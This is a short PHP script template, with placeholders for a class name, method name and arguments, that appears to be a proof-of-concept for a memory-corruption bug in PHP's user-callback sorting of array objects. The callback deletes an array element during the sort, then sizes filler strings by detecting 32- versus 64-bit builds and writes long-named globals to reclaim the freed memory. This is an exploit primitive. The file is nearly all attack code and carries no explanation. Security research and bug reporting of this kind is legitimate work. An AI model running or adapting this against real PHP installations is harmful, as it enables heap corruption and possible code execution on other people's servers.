<?php

error_reporting(E_ALL);
$first = true;
function uc($a,$b)
{
	global $first;

	/* Detect 32 vs 64 bit */
	$i = 0x7fffffff;
	$i++;
	if (is_float($i)) {
		$y = str_repeat("A", 39);
	} else {
		$y = str_repeat("A", 67);       
	}     
	if ($first) {
		unset($GLOBALS['arr']["B"]);
		$GLOBALS['_____________________________________________________________________________a'] = 1;
		$GLOBALS['_____________________________________________________________________________b'] = 2;
		$GLOBALS['_____________________________________________________________________________x'] .= $y;
	}
	$first=false;
}

$arr = new %{classname}(array("A" => str_repeat("A", 164),"B" => str_repeat("B", 164), "C" => str_repeat("C", 164), "D" => str_repeat("D", 164)));

$arr->%{methodname}(%{args2}"uc");
